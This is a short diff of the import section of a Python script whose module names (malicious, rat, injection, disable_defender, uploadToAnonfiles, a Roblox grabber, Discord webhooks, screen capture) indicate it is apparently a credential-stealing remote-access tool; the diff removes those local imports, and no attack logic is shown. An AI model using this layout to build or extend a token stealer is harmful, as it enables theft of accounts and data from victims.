@@ -1,7 +1,6 @@
 from requirements_installation import requirementsinstallation
 
 try:
-    ### Imports
     import getpass
     import platform
     import ctypes
@@ -13,7 +12,7 @@ try:
     import subprocess
     import threading
     import sys
-    import dhooks
+    import dhooks                                                    ### Imports
     import requests
     from base64 import b64decode
     from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
@@ -26,19 +25,6 @@ try:
     from zipfile import ZipFile
     from Crypto.Cipher import AES
     from PIL import ImageGrab
-    
-    ### File Imports
-    import _webhook
-    import discordc
-    import informations
-    import malicious
-    import rat
-    import injection
-    from config import Config
-    from _roblox import RobloxX
-    from anonFile import uploadToAnonfiles
-    from startup import StartUp
-    from disable_defender import disabledefender
 except Exception:
     requirementsinstallation()
 
